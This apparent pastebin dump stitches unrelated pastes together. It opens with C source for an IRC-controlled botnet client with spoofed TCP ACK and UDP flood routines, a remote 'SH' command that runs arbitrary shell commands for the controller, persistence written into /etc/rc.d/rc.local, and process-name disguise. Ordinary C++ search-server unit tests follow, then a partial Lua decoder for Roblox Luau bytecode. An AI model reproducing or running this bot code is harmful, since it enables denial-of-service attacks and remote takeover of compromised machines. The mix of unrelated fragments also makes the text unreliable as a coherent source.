        unsigned int psize=20, source, dest, check;
        unsigned long saddr, daddr,secs;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
                Send(sock,""NOTICE %s :ACKFLOOD <target> <port> <secs>\n"",sender);
                exit(1);
        }
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        {int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}

        daddr=host2ip(sender,argv[1]);
        secs=atol(argv[3]);
	dest=htons(atoi(argv[2]));

        Send(sock,""NOTICE %s :Flooding with TCP ACK %s.\n"",sender,argv[1]);

	send_tcp.ip.ihl = 5;
        send_tcp.ip.version = 4;
        send_tcp.ip.tos = 16;
        send_tcp.ip.frag_off = 64;
	send_tcp.ip.ttl = 255;
	send_tcp.ip.protocol = 6;
	send_tcp.tcp.doff = 5;
        send_tcp.tcp.res1 = 0;
        send_tcp.tcp.cwr = 0;
        send_tcp.tcp.ece = 0;
        send_tcp.tcp.urg = 0;
        send_tcp.tcp.ack = 1;
        send_tcp.tcp.psh = 1;
	send_tcp.tcp.rst = 0;
        send_tcp.tcp.fin = 0;
        send_tcp.tcp.syn = 0;
	send_tcp.tcp.window = 30845;
        send_tcp.tcp.urg_ptr = 0;


        while(1) {
		saddr=getspoof();
		if (atoi(argv[2]) == 0) dest=rand();
                send_tcp.ip.tot_len = htons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.check = 0;
                send_tcp.ip.saddr = saddr;
                send_tcp.ip.daddr = daddr;
                send_tcp.tcp.source = rand();
                send_tcp.tcp.dest = dest;
                send_tcp.tcp.seq = rand();
                send_tcp.tcp.ack_seq = rand();
                send_tcp.tcp.check = 0;
                sin.sin_family = AF_INET;
                sin.sin_port = send_tcp.tcp.dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = in_cksum((unsigned short *)&send_tcp, 40);
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.dest_address = send_tcp.ip.daddr;
                pseudo_header.placeholder = 0;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
                sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));


                if (a >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        a=0;
                }
                a++;
        }
        close(get);
        exit(0);


}

void nsackflood(int sock, char *sender, int argc, char **argv) {
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
        unsigned int psize=20, source, dest, check;
        unsigned long saddr, daddr,secs;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
                Send(sock,""NOTICE %s :NSACKFLOOD <target> <port> <secs>\n"",sender);
                exit(1);
        }
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        {int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}

        daddr=host2ip(sender,argv[1]);
        secs=atol(argv[3]);
        dest=htons(atoi(argv[2]));

        Send(sock,""NOTICE %s :Flooding with TCP ACK %s.\n"",sender,argv[1]);

        send_tcp.ip.ihl = 5;
        send_tcp.ip.version = 4;
        send_tcp.ip.tos = 16;
        send_tcp.ip.frag_off = 64;
        send_tcp.ip.ttl = 255;
        send_tcp.ip.protocol = 6;
        send_tcp.tcp.doff = 5;
        send_tcp.tcp.res1 = 0;
        send_tcp.tcp.cwr = 0;
        send_tcp.tcp.ece = 0;
        send_tcp.tcp.urg = 0;
        send_tcp.tcp.ack = 1;
        send_tcp.tcp.psh = 1;
        send_tcp.tcp.rst = 0;
        send_tcp.tcp.fin = 0;
        send_tcp.tcp.syn = 0;
        send_tcp.tcp.window = 30845;
        send_tcp.tcp.urg_ptr = 0;


        while(1) {
                saddr=INADDR_ANY;
                if (atoi(argv[2]) == 0) dest=rand();
                send_tcp.ip.tot_len = htons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.check = 0;
                send_tcp.ip.saddr = saddr;
                send_tcp.ip.daddr = daddr;
                send_tcp.tcp.source = rand();
                send_tcp.tcp.dest = dest;
                send_tcp.tcp.seq = rand();
                send_tcp.tcp.ack_seq = rand();
                send_tcp.tcp.check = 0;
                sin.sin_family = AF_INET;
                sin.sin_port = send_tcp.tcp.dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = in_cksum((unsigned short *)&send_tcp, 40);
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.dest_address = send_tcp.ip.daddr;
                pseudo_header.placeholder = 0;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
                sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));


                if (a >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        a=0;
                }
                a++;
        }
        close(get);
        exit(0);


}


void unknown(int sock, char *sender, int argc, char **argv) {
	int flag=1,fd,i;
	unsigned long secs;
	char *buf=(char*)malloc(9216);
 	struct hostent *hp;
	struct sockaddr_in in;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 2) {
                Send(sock,""NOTICE %s :UNKNOWN <target> <secs>\n"",sender);
                exit(1);
        }
        secs=atol(argv[2]);
	memset((void*)&in,0,sizeof(struct sockaddr_in));
	in.sin_addr.s_addr=host2ip(sender,argv[1]);
	in.sin_family = AF_INET;
        Send(sock,""NOTICE %s :Unknowning %s.\n"",sender,argv[1]);
	while(1) {
		in.sin_port = rand();
		if ((fd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0);
		else {
			flag=1;
			ioctl(fd,FIONBIO,&flag);
			sendto(fd,buf,9216,0,(struct sockaddr*)&in,sizeof(in));
			close(fd);
		}
                if (i >= 50) {
                        if (time(NULL) >= start+secs) break;
                        i=0;
                }
                i++;
	}
        close(fd);
	exit(0);
}
void move(int sock, char *sender, int argc, char **argv) {
        if (argc < 1) {
                Send(sock,""NOTICE %s :MOVE <server>\n"",sender);
                exit(1);
        }
	server=strdup(argv[1]);
	changeservers=1;
	close(sock);
}
void killall(int sock, char *sender, int argc, char **argv) {
        unsigned long i;
        for (i=0;i<numpids;i++) {
                if (pids[i] != 0 && pids[i] != getpid()) {
                        if (sender) Send(sock,""NOTICE %s :Killing pid %d.\n"",sender,pids[i]);
                        kill(pids[i],9);
                }
        }
}
void killd(int sock, char *sender, int argc, char **argv) {
	if (!disable) kill(0,9);
	else Send(sock,""NOTICE %s :Unable to comply.\n"");
}
struct FMessages { char *cmd; void (* func)(int,char *,int,char **); } flooders[] = {
	{ ""RANDOMFLOOD"", randomflood},
	{ ""NSACKFLOOD"", nsackflood },
	{ ""NSSYNFLOOD"", nssynflood },
	{ ""ACKFLOOD"", ackflood },
        { ""SYNFLOOD"", synflood },
        { ""UDP"", udp },
	{ ""UNKNOWN"", unknown },

        { ""NICK"", nickc },
        { ""SERVER"", move },
	{ ""GETSPOOFS"", getspoofs },
        { ""SPOOFS"", spoof },

	{ ""DISABLE"", disable },
        { ""ENABLE"", enable },

        { ""KILL"", killd },
	{ ""GET"", get },
        { ""VERSION"", version },
        { ""KILLALL"", killall },
{ (char *)0, (void (*)(int,char *,int,char **))0 } };
void _PRIVMSG(int sock, char *sender, char *str) {
        int i;
        char *to, *message;
        for (i=0;i<strlen(str) && str[i] != ' ';i++);
        str[i]=0;
        to=str;
        message=str+i+2;
        for (i=0;i<strlen(sender) && sender[i] != '!';i++);
        sender[i]=0;
        if (*message == '!' && !strcasecmp(to,chan)) {
                char *params[12], name[1024]={0};
                int num_params=0, m;
                message++;
                for (i=0;i<strlen(message) && message[i] != ' ';i++);
                message[i]=0;
                if (strwildmatch(message,nick)) return;
                message+=i+1;
                if (!strncmp(message,""IRC "",4)) if (disabled) Send(sock,""NOTICE %s :Unable to comply.\n"",sender); else Send(sock,""%s\n"",message+4);
                if (!strncmp(message,""SH "",3)) {
                        char buf[1024];
                        FILE *command;
                        if (mfork(sender) != 0) return;
                        memset(buf,0,1024);
                        sprintf(buf,""export PATH=/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin;%s"",message+3);
                        command=popen(buf,""r"");
                        while(!feof(command)) {
                                memset(buf,0,1024);
                                fgets(buf,1024,command);
                                Send(sock,""NOTICE %s :%s\n"",sender,buf);
                                sleep(1);
                        }
                        pclose(command);
                        exit(0);
                }
                m=strlen(message);
                for (i=0;i<m;i++) {
                        if (*message == ' ' || *message == 0) break;
                        name[i]=*message;
                        message++;
                }
                for (i=0;i<strlen(message);i++) if (message[i] == ' ') num_params++;
                num_params++;
                if (num_params > 10) num_params=10;
                params[0]=name;
                params[num_params+1]=""\0"";
                m=1;
                while (*message != 0) {
                        message++;
                        if (m >= num_params) break;
                        for (i=0;i<strlen(message) && message[i] != ' ';i++);
                        params[m]=(char*)malloc(i+1);
                        strncpy(params[m],message,i);
                        params[m][i]=0;
                        m++;
                        message+=i;
                }
                for (m=0; flooders[m].cmd != (char *)0; m++) {
                        if (!strcasecmp(flooders[m].cmd,name)) {
                                flooders[m].func(sock,sender,num_params-1,params);
                                for (i=1;i<num_params;i++) free(params[i]);
                                return;
                        }
                }
        }
}
void _376(int sock, char *sender, char *str) {
        Send(sock,""MODE %s -xi\n"",nick);
        Send(sock,""JOIN %s :%s\n"",chan);
        Send(sock,""WHO %s\n"",nick);
}
void _PING(int sock, char *sender, char *str) {
        Send(sock,""PONG %s\n"",str);
}
void _352(int sock, char *sender, char *str) {
        int i,d;
        char *msg=str;
        struct hostent *hostm;
        unsigned long m;
        for (i=0,d=0;d<5;d++) {
                for (;i<strlen(str) && *msg != ' ';msg++,i++); msg++;
                if (i == strlen(str)) return;
        }
        for (i=0;i<strlen(msg) && msg[i] != ' ';i++);
        msg[i]=0;
        if (!strcasecmp(msg,nick) && !spoofsm) {
                msg=str;
                for (i=0,d=0;d<3;d++) {
                        for (;i<strlen(str) && *msg != ' ';msg++,i++); msg++;
                        if (i == strlen(str)) return;
                }
                for (i=0;i<strlen(msg) && msg[i] != ' ';i++);
                msg[i]=0;
                if ((m = inet_addr(msg)) == -1) {
                        if ((hostm=gethostbyname(msg)) == NULL) {
                                Send(sock,""NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\n"",chan);
                                return;
                        }
                        memcpy((char*)&m, hostm->h_addr, hostm->h_length);
                }
                ((char*)&spoofs)[3]=((char*)&m)[0];
                ((char*)&spoofs)[2]=((char*)&m)[1];
                ((char*)&spoofs)[1]=((char*)&m)[2];
                ((char*)&spoofs)[0]=0;
                spoofsm=256;
        }
}
void _433(int sock, char *sender, char *str) {
        free(nick);
        nick=makestring();
}
void _NICK(int sock, char *sender, char *str) {
	int i;
        for (i=0;i<strlen(sender) && sender[i] != '!';i++);
        sender[i]=0;
	if (!strcasecmp(sender,nick)) {
		if (*str == ':') str++;
		if (nick) free(nick);
		nick=strdup(str);
	}
}
struct Messages { char *cmd; void (* func)(int,char *,char *); } msgs[] = {
        { ""352"", _352 },
        { ""376"", _376 },
        { ""433"", _433 },
        { ""422"", _376 },
        { ""PRIVMSG"", _PRIVMSG },
        { ""PING"", _PING },
	{ ""NICK"", _NICK },
{ (char *)0, (void (*)(int,char *,char *))0 } };
void con() {
        struct sockaddr_in srv;
        unsigned long ipaddr,start;
        int flag;
        struct hostent *hp;
start:
	sock=-1;
	flag=1;
	if (changeservers == 0) server=servers[rand()%numservers];
	changeservers=0;
        while ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0);
	if (inet_addr(server) == 0 || inet_addr(server) == -1) {
		if ((hp = gethostbyname(server)) == NULL) {
			server=NULL;
			close(sock);
			goto start;
		}
		bcopy((char*)hp->h_addr, (char*)&srv.sin_addr, hp->h_length);
	}
	else srv.sin_addr.s_addr=inet_addr(server);
        srv.sin_family = AF_INET;
        srv.sin_port = htons(4040);
	ioctl(sock,FIONBIO,&flag);
	start=time(NULL);
	while(time(NULL)-start < 10) {
		errno=0;
		if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) == 0 || errno == EISCONN) {
		        setsockopt(sock,SOL_SOCKET,SO_LINGER,0,0);
		        setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,0,0);
		        setsockopt(sock,SOL_SOCKET,SO_KEEPALIVE,0,0);
			return;
		}
		if (!(errno == EINPROGRESS ||errno == EALREADY)) break;
		sleep(1);
	}
	server=NULL;
	close(sock);
	goto start;
}
int main(int argc, char **argv) {
        int on,i;
        char cwd[256],*str;
        FILE *file;
#ifdef STARTUP
	str=""/etc/rc.d/rc.local"";
	file=fopen(str,""r"");
	if (file == NULL) {
		str=""/etc/rc.conf"";
		file=fopen(str,""r"");
	}
        if (file != NULL) {
                char outfile[256], buf[1024];
                int i=strlen(argv[0]), d=0;
                getcwd(cwd,256);
                if (strcmp(cwd,""/"")) {
                        while(argv[0][i] != '/') i--;
                        sprintf(outfile,""\""%s%s\""\n"",cwd,argv[0]+i);
                        while(!feof(file)) {
                                fgets(buf,1024,file);
                                if (!strcasecmp(buf,outfile)) d++;
                        }
                        if (d == 0) {
                                FILE *out;
                                fclose(file);
                                out=fopen(str,""a"");
                                if (out != NULL) {
                                        fputs(outfile,out);
                                        fclose(out);
                                }
                        }
                        else fclose(file);
                }
                else fclose(file);
        }
#endif
        if (fork()) exit(0);
#ifdef FAKENAME
	strncpy(argv[0],FAKENAME,strlen(argv[0]));
        for (on=1;on<argc;on++) memset(argv[on],0,strlen(argv[on]));
#endif
        srand((time(NULL) ^ getpid()) + getppid());
        nick=makestring();
        ident=makestring();
        user=makestring();
        chan=CHAN;
	server=NULL;
sa:
#ifdef IDENT
        for (i=0;i<numpids;i++) {
                if (pids[i] != 0 && pids[i] != getpid()) {
                        kill(pids[i],9);
			waitpid(pids[i],NULL,WNOHANG);
                }
        }
	pids=NULL;
	numpids=0;
	identd();
#endif
	con();
        Send(sock,""NICK %s\nUSER %s localhost localhost :%s\n"",nick,ident,user);
        while(1) {
                unsigned long i;
                fd_set n;
                struct timeval tv;
                FD_ZERO(&n);
                FD_SET(sock,&n);
                tv.tv_sec=60*20;
                tv.tv_usec=0;
                if (select(sock+1,&n,(fd_set*)0,(fd_set*)0,&tv) <= 0) goto sa;
                for (i=0;i<numpids;i++) if (waitpid(pids[i],NULL,WNOHANG) > 0) {
                        unsigned int *newpids,on;
                        for (on=i+1;on<numpids;on++) pids[on-1]=pids[on];
			pids[on-1]=0;
                        numpids--;
                        newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
                        for (on=0;on<numpids;on++) newpids[on]=pids[on];
                        free(pids);
                        pids=newpids;
                }
                if (FD_ISSET(sock,&n)) {
                        char buf[4096], *str;
                        int i;
                        if ((i=recv(sock,buf,4096,0)) <= 0) goto sa;
                        buf[i]=0;
                        str=strtok(buf,""\n"");
                        while(str && *str) {
                                char name[1024], sender[1024];
                                filter(str);
                                if (*str == ':') {
                                        for (i=0;i<strlen(str) && str[i] != ' ';i++);
                                        str[i]=0;
                                        strcpy(sender,str+1);
                                        strcpy(str,str+i+1);
                                }
                                else strcpy(sender,""*"");
                                for (i=0;i<strlen(str) && str[i] != ' ';i++);
                                str[i]=0;
                                strcpy(name,str);
                                strcpy(str,str+i+1);
                                for (i=0;msgs[i].cmd != (char *)0;i++) if (!strcasecmp(msgs[i].cmd,name)) msgs[i].func(sock,sender,str);
                                if (!strcasecmp(name,""ERROR"")) goto sa;
                                str=strtok((char*)NULL,""\n"");
                        }
                }
        }
        return 0;
}

"
BJQQLY5N,unit test search server 2022,Maksim1473,C++,Sunday 18th of February 2024 03:45:58 PM CDT,"const double EPSILON = 1e-6;

//  ,     -   
void TestExcludeStopWordsFromAddedDocumentContent() {
    const int doc_id = 42;
    const string content = ""cat in the city""s;
    const vector<int> ratings = { 1, 2, 3 };
    {
        SearchServer server;
        server.AddDocument(doc_id, content, DocumentStatus::ACTUAL, ratings);
        const auto found_docs = server.FindTopDocuments(""in""s);
        ASSERT_EQUAL(found_docs.size(), 1u);
        const Document& doc0 = found_docs[0];
        ASSERT_EQUAL(doc0.id, doc_id);
    }

    {
        SearchServer server;
        server.SetStopWords(""in the""s);
        server.AddDocument(doc_id, content, DocumentStatus::ACTUAL, ratings);
        ASSERT_HINT(server.FindTopDocuments(""in""s).empty(), ""Stop words must be excluded from documents""s);
    }
}

//    
void TestAddAndFindDocument() {
    const int doc_id = 1;
    const string content = ""Hey class lets find this document""s;
    const vector<int> ratings = { 2, 1, -2 };

    SearchServer server;
    server.AddDocument(doc_id, content, DocumentStatus::ACTUAL, ratings);
    vector<Document> res = server.FindTopDocuments(""class find this document"");
    ASSERT_EQUAL(res[0].id, doc_id);
}

//   -   
void TestDeleteStopWordFromDocument() {
    const int doc_id = 2;
    const string content = ""hey class lets delete stop words from this document""s;
    const vector<int> ratings = { 2, 1, -2 };
    {
        SearchServer server;
        server.SetStopWords(""hey from this lets""s);
        server.AddDocument(doc_id, content, DocumentStatus::ACTUAL, ratings);
        //string res_words = ""class delete stop words document""s;
        vector<string> res = SplitIntoWords(""class delete document stop words""s);    //   -
        vector<string> words_res;
        DocumentStatus status = DocumentStatus::ACTUAL;
        tie(words_res, status) = server.MatchDocument(""class delete stop words document""s, doc_id);
        ASSERT_HINT(words_res == res, ""Stop-words should be removed from the document"");
    }

    //    -
    {
        SearchServer server;
        server.SetStopWords(""""s);
        server.AddDocument(doc_id, content, DocumentStatus::ACTUAL, ratings);
        //string res_words = ""class delete stop words document""s;
        vector<string> res = SplitIntoWords(""class delete document from hey lets stop this words""s);    //   -
        vector<string> words_res;
        DocumentStatus status = DocumentStatus::ACTUAL;
        tie(words_res, status) = server.MatchDocument(""hey class lets delete stop words from this document""s, doc_id);
        ASSERT_HINT(words_res == res, ""Empty stop-word string error"");
    }
    
}

//   ,  -
void TestDeleteDocumentsWithMinusWords() {

    int doc_id = 3;
    string content = ""hey class lets delete minus words from this document""s;
    vector<int> ratings = { 2, 1, -2 };
    string query = ""class delete words -minus document""s;

    SearchServer server;
    server.AddDocument(doc_id, content, DocumentStatus::ACTUAL, ratings);

    doc_id = 1;
    content = ""Hey class lets find this document""s;
    ratings = { 2, 1, -2 };

    server.AddDocument(doc_id, content, DocumentStatus::ACTUAL, ratings);
    ASSERT_EQUAL_HINT(server.FindTopDocuments(query).size(), 1, ""Not removed document with one minus-word""s);
}

//   
void TestMatchDocument() {
    const int doc_id = 1;
    const string content = ""Hey class lets find this document""s;
    const vector<int> ratings = { 2, 1, -2 };

    SearchServer server;
    server.AddDocument(doc_id, content, DocumentStatus::ACTUAL, ratings);
    vector<string> words_res;
    DocumentStatus status = DocumentStatus::ACTUAL;
    tie(words_res, status) = server.MatchDocument(""class find document -this""s, doc_id);
    ASSERT_HINT(words_res.empty(), ""Document should be deleted when minus-words found"");  //    -  -

    tie(words_res, status) = server.MatchDocument(""class find document""s, doc_id);
    vector<string> res = { ""class""s, ""document""s, ""find""s };    //  
    ASSERT_HINT(words_res == res, ""Match document error""s);
}

//    (  )
void TestCorrectSort() {
    SearchServer search_server;
    search_server.SetStopWords(""  ""s);

    search_server.AddDocument(0, ""    ""s, DocumentStatus::ACTUAL, { 8, -3 });
    search_server.AddDocument(1, ""   ""s, DocumentStatus::ACTUAL, { 7, 2, 7 });
    search_server.AddDocument(2, ""   ""s, DocumentStatus::ACTUAL, { 5, -12, 2, 1 });
    search_server.AddDocument(3, ""  ""s, DocumentStatus::BANNED, { 9 });

    struct Res {
        int id;
        double rel;
    };
    Res res[3] = { {1, 0.693147}, {0, 0.346574}, {2, 0.346574} };
    const string query = ""  ""s;
    for (auto& doc : search_server.FindTopDocuments(query)) {
        static int i = 0;
        ASSERT_HINT(doc.id == res[i].id || doc.relevance == res[i].rel, ""The sorting should be in descending order""s);
        i++;
    }
}

//    
void TestCalculateAverage() {
    SearchServer search_server;
    search_server.SetStopWords(""  ""s);

    search_server.AddDocument(0, ""    ""s, DocumentStatus::ACTUAL, { 8, -3 });
    search_server.AddDocument(1, ""   ""s, DocumentStatus::ACTUAL, { 7, 2, 7 });

    vector<Document> out = search_server.FindTopDocuments("" ""s);
    vector<Document> res = { {0, 0, 2}, {1, 0, 5} }; // relevance = 0,    

    ASSERT_HINT(equal(out.begin(), out.end(), res.begin(), res.end(), [](const Document& lhs, const Document& rhs) {
        return (lhs.id == rhs.id && lhs.rating == rhs.rating);
        }), ""The average rating is calculated incorrectly""s);
}

//      ,  
void TestPredicateFiltration() {
    SearchServer search_server;
    search_server.SetStopWords(""  ""s);

    search_server.AddDocument(0, ""    ""s, DocumentStatus::ACTUAL, { 8, -3 });
    search_server.AddDocument(1, ""   ""s, DocumentStatus::ACTUAL, { 7, 2, 7 });
    search_server.AddDocument(2, ""   ""s, DocumentStatus::ACTUAL, { 5, -12, 2, 1 });
    search_server.AddDocument(3, ""  ""s, DocumentStatus::BANNED, { 9 });
    Document res[2] = { {0, 0.173287, 2 }, {2, 0.173287, -1} };

    for (const Document& document : search_server.FindTopDocuments(""  ""s, [](int document_id, DocumentStatus status, int rating) { return document_id % 2 == 0; })) {
        static int i = 0;
        ASSERT(document.id == res[i].id && document.relevance - res[i].relevance < EPSILON&& document.rating == res[i].rating);
        i++;
    }
}

//  TestSearchServer      
void TestSearchServer() {
    RUN_TEST(TestExcludeStopWordsFromAddedDocumentContent);
    RUN_TEST(TestAddAndFindDocument);
    RUN_TEST(TestDeleteStopWordFromDocument);
    RUN_TEST(TestDeleteDocumentsWithMinusWords);
    RUN_TEST(TestMatchDocument);
    RUN_TEST(TestCorrectSort);
    RUN_TEST(TestCalculateAverage);
    RUN_TEST(TestPredicateFiltration);
}"
K2Wd0hh2,de,HTDBarsi,Lua,Sunday 18th of February 2024 03:43:50 PM CDT,"local _tostring = tostring
local function tostring(e)
	if typeof(e) == ""userdata"" then
		local mt = getmetatable(e)
		if type(mt) == ""table"" then
			local __type = rawget(mt, ""__type"")
			local t = type(__type)
			if t == ""string"" then
				return __type
			elseif t == ""function"" then
				return __type()
			end
		end
	end
	return _tostring(e)
end

local function deserialize(bytecode)
	local pos = 1
	local reader do
		reader = {}
		function reader:pos() return pos end
		function reader:nextByte()
			local v = string.byte(bytecode, pos, pos)
			pos = pos + 1
			return v
		end
		function reader:nextChar()
			return string.char(reader:nextByte());
		end
		function reader:nextInt()
			local a,b,c,d = reader:nextByte(),reader:nextByte(),reader:nextByte(),reader:nextByte()
			return (
				bit32.bor(
					bit32.lshift(d, 24),
					bit32.bor(
						bit32.lshift(c, 16),
						bit32.bor(
							bit32.lshift(b, 8),
							a)))
			)
		end
		function reader:nextFloat()
			local a,b,c,d = reader:nextChar(),reader:nextChar(),reader:nextChar(),reader:nextChar()
			return string.unpack(""f"",a..b..c..d)
		end
		function reader:nextVarInt()
			local c1, c2, b, r = 0, 0, 0, 0
			repeat
				c1 = reader:nextByte()
				c2 = bit32.band(c1, 0x7F)
				r = bit32.bor(r, bit32.lshift(c2, b))
				b = b + 7
			until not bit32.btest(c1, 0x80)
			return r;
		end
		function reader:nextString()
			local result = """"
			local len = reader:nextVarInt();
			for i = 1, len do
				result = result .. reader:nextChar();
			end
			return result;
		end
		function reader:nextDouble()
			local str = '';
			for i = 1, 8 do
				str = str .. string.char(reader:nextByte());
			end
			return string.unpack(""<d"", str)
		end
	end

	local status = reader:nextByte()
	if (status ~= 0) then
		local protoTable = {}
		local stringTable = {}

		local typeEncodingVersion = reader:nextByte();

		local sizeStrings = reader:nextVarInt()
		for i = 1,sizeStrings do
			stringTable[i] = reader:nextString()
		end

		local sizeProtos = reader:nextVarInt();
		for i = 1,sizeProtos do
			protoTable[i] = { -- pre-initialize an entry
				codeTable = {},
				kTable = {},
				pTable = {},
				smallLineInfo = {},
				largeLineInfo = {}
			}
		end

		for i = 1,sizeProtos do
			local proto = protoTable[i]
			proto.maxStackSize = reader:nextByte()
			proto.numParams = reader:nextByte()
			proto.numUpValues = reader:nextByte()
			proto.isVarArg = reader:nextByte()

			if (status > 3) then
				proto.flags = reader:nextByte()
				proto.typeinfo = reader:nextString()
			end

			proto.sizeCode = reader:nextVarInt()
			for j = 1,proto.sizeCode do
				proto.codeTable[j] = reader:nextInt()
			end

			proto.sizeConsts = reader:nextVarInt();
			for j = 1,proto.sizeConsts do
				local k = {};
				k.type = reader:nextByte();
				if k.type == 1 then -- boolean
					k.value = (reader:nextByte() == 1 and true or false)
				elseif k.type == 2 then -- number
					k.value = reader:nextDouble()
				elseif k.type == 3 then -- string
					k.value = stringTable[reader:nextVarInt()]
				elseif k.type == 4 then -- cache
					k.value = reader:nextInt()
				elseif k.type == 5 then -- table
					k.value = { [""size""] = reader:nextVarInt(), [""ids""] = {} }
					for s = 1,k.value.size do
						table.insert(k.value.ids, reader:nextVarInt() + 1)
					end
				elseif k.type == 6 then -- closure
					k.value = reader:nextVarInt() + 1 -- closure id
				elseif k.type == 7 then -- vector
					local x,y,z,w = reader:nextFloat(),reader:nextFloat(),reader:nextFloat(),reader:nextFloat()
					local proxy = newproxy(true)
					local mt = getmetatable(proxy)
					warn(x,y,z)
					mt.__type = `Vector3.new({x}, {y}, {z})`--string.format(""Vector3.new(%i, %i, %i)"", tonumber(x), tonumber(y), tonumber(z))
					k.value = proxy
				elseif k.type ~= 0 then
					error(string.format(""Unrecognized constant type: %i"", k.type))
				end
				proto.kTable[j] = k
			end

			proto.sizeProtos = reader:nextVarInt();
			for j = 1,proto.sizeProtos do
				proto.pTable[j] = protoTable[reader:nextVarInt() + 1]
			end

			proto.lineDefined = reader:nextVarInt()

			local protoSourceId = reader:nextVarInt()
			proto.source = stringTable[protoSourceId]

			if (reader:nextByte() == 1) then -- Has Line info?
				local compKey = reader:nextVarInt()
				for j = 1,proto.sizeCode do
					proto.smallLineInfo[j] = reader:nextByte()
				end

				local n = bit32.band(proto.sizeCode + 3, -4)
				local intervals = bit32.rshift(proto.sizeCode - 1, compKey) + 1

				for j = 1,intervals do
					proto.largeLineInfo[j] = reader:nextInt()
				end
			end

			if (reader:nextByte() == 1) then -- Has Debug info?
				error'disassemble() can only be called on ROBLOX scripts'
			end
		end

		local mainProtoId = reader:nextVarInt()
		return protoTable[mainProtoId + 1], protoTable, stringTable;
	else
		error(string.format(""Invalid bytecode (version: %i)"", status))
		return nil;
	end
end

local function getluauoptable()
	local caseMultiplier = 227
	local optable = {
		{ [""name""] = ""NOP"", [""type""] = ""none"", [""case""] = 0 },
		{ [""name""] = ""BREAK"", [""type""] = ""none"", [""case""] = 1 },
		{ [""name""] = ""LOADNIL"", [""type""] = ""iA"", [""case""] = 2 },
		{ [""name""] = ""LOADB"", [""type""] = ""iABC"", [""case""] = 3 },
		{ [""name""] = ""LOADN"", [""type""] = ""iABx"", [""case""] = 4 },
		{ [""name""] = ""LOADK"", [""type""] = ""iABx"", [""case""] = 5 },
		{ [""name""] = ""MOVE"", [""type""] = ""iAB"", [""case""] = 6 },
		{ [""name""] = ""GETGLOBAL"", [""type""] = ""iAC"", [""case""] = 7, [""aux""] = true },
		{ [""name""] = ""SETGLOBAL"", [""type""] = ""iAC"", [""case""] = 8, [""aux""] = true },
		{ [""name""] = ""GETUPVAL"", [""type""] = ""iAB"", [""case""] = 9 },
		{ [""name""] = ""SETUPVAL"", [""type""] = ""iAB"", [""case""] = 10 },
		{ [""name""] = ""CLOSEUPVALS"", [""type""] = ""iA"", [""case""] = 11 },
		{ [""name""] = ""GETIMPORT"", [""type""] = ""iABx"", [""case""] = 12, [""aux""] = true },
		{ [""name""] = ""GETTABLE"", [""type""] = ""iABC"", [""case""] = 13 },
		{ [""name""] = ""SETTABLE"", [""type""] = ""iABC"", [""case""] = 14 },
		{ [""name""] = ""GETTABLEKS"", [""type""] = ""iABC"", [""case""] = 15, [""aux""] = true },
		{ [""name""] = ""SETTABLEKS"", [""type""] = ""iABC"", [""case""] = 16, [""aux""] = true },
		{ [""name""] = ""GETTABLEN"", [""type""] = ""iABC"", [""case""] = 17 },
		{ [""name""] = ""SETTABLEN"", [""type""] = ""iABC"", [""case""] = 18 },
		{ [""name""] = ""NEWCLOSURE"", [""type""] = ""iABx"", [""case""] = 19 },
		{ [""name""] = ""NAMECALL"", [""type""] = ""iABC"", [""case""] = 20, [""aux""] = true },
		{ [""name""] = ""CALL"", [""type""] = ""iABC"", [""case""] = 21 },
		{ [""name""] = ""RETURN"", [""type""] = ""iAB"", [""case""] = 22 },
		{ [""name""] = ""JUMP"", [""type""] = ""isBx"", [""case""] = 23 },
		{ [""name""] = ""JUMPBACK"", [""type""] = ""isBx"", [""case""] = 24 },
		{ [""name""] = ""JUMPIF"", [""type""] = ""iAsBx"", [""case""] = 25 },
		{ [""name""] = ""JUMPIFNOT"", [""type""] = ""iAsBx"", [""case""] = 26 },
		{ [""name""] = ""JUMPIFEQ"", [""type""] = ""iAsBx"", [""case""] = 27, [""aux""] = true },
		{ [""name""] = ""JUMPIFLE"", [""type""] = ""iAsBx"", [""case""] = 28, [""aux""] = true },
